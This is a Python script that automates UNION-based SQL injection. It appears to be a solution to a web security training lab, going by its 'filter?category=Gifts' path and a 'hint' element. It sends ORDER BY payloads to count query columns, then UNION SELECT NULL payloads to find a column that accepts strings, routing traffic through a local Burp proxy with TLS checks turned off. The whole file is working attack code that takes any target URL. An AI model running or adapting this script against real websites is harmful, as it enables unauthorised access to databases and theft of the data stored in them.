import sys
import requests
import urllib3
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# if u want to use burp suite as proxy to see all requests. Default on.
use_proxy = True
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
path = "filter?category=Gifts"


def find_column_number(url: str) -> int:
    """
    Exploit SQL injection to figure out number of columns
    :param url: url to exploit
    :return: number of columns
    """
    for i in range(1, 50):
        sql_payload = f"'+ORDER+BY+{i}--"
        if use_proxy:
            request_to_server = requests.get(
                url + path + sql_payload, verify=False, proxies=proxy
            )
        else:
            request_to_server = requests.get(url + path + sql_payload)
        if request_to_server.status_code == 500:
            return i - 1
    return 0


def find_payload_string(url: str) -> str:
    """
    Find string that is used in SQL injection
    :param url: url to exploit
    :return: string that is used in SQL injection
    """
    if use_proxy:
        request_to_server = requests.get(url, verify=False, proxies=proxy)
    else:
        request_to_server = requests.get(url)
    soup = BeautifulSoup(request_to_server.text, "html.parser")
    string_with_payload = str(soup.find(id="hint"))
    start_string = string_with_payload.find("'") + 1
    end_string = string_with_payload.rfind("'")
    payload_string = string_with_payload[start_string:end_string]
    return payload_string


def find_string_column(url: str, number_of_columns: int) -> int:
    """
    Find column that contains string
    :param url: url to exploit
    :param number_of_columns: number of columns
    :return: column that contains string
    """
    payload_string = find_payload_string(url)
    print(f"[+] finding  {payload_string} in results")
    for column in range(1, number_of_columns + 1):
        payload_list = ["NULL"] * number_of_columns
        payload_list[column - 1] = f"'{find_payload_string(url)}'"
        sql_payload = f"'+UNION+SELECT+{','.join(payload_list)}--"
        if use_proxy:
            response = requests.get(
                url + path + sql_payload, verify=False, proxies=proxy
            )
        else:
            response = requests.get(url + path + sql_payload)
        if "Internal Server Error" not in response.text:
            return column
    return 0


def main() -> None:
    """
    Main function
    """
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
        sys.exit(-1)
    print("[-] Figuring out number of columns... please wait")
    number_of_columns = find_column_number(url)
    if number_of_columns:
        print(f"[+] SQL injections successful. Numbers of columns: {number_of_columns}")
        print("[+] Figuring out which columns contains text... please wait")
        string_column = find_string_column(url, number_of_columns)
        if string_column:
            print(f"[+] The column that contains text is {string_column}")
        else:
            print("[-] We were not able to find a column that has a string data type")
    else:
        print("[-] SQL injections unsuccessful")


if __name__ == "__main__":
    main()
